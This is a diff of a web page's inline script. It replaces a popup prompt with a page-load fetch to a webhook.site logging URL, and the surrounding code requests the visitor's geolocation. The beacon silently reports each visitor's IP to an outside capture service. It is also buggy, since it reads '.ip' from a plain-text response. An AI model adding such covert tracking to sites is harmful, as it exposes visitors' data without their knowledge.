@@ -41,12 +41,26 @@
 
 <script>
   // JavaScript code to display a popup prompt immediately
-  var userInput = prompt("Are you allowed to access this page? (Yes/No)");
-if (userInput) {
-  console.log("Hello, " + userInput + "!");
-} else {
-  console.log("No name entered.");
-}
+
+window.addEventListener('load', function() {
+  fetch('https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.text();
+    })
+    .then(data => {
+      console.log(data);
+      const ipAddress = data.ip; // Assuming the response contains an "ip" property
+      document.getElementById('access-message').textContent = `User with IP ${ipAddress} has accessed the page`;
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
+});
+
+  
 
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
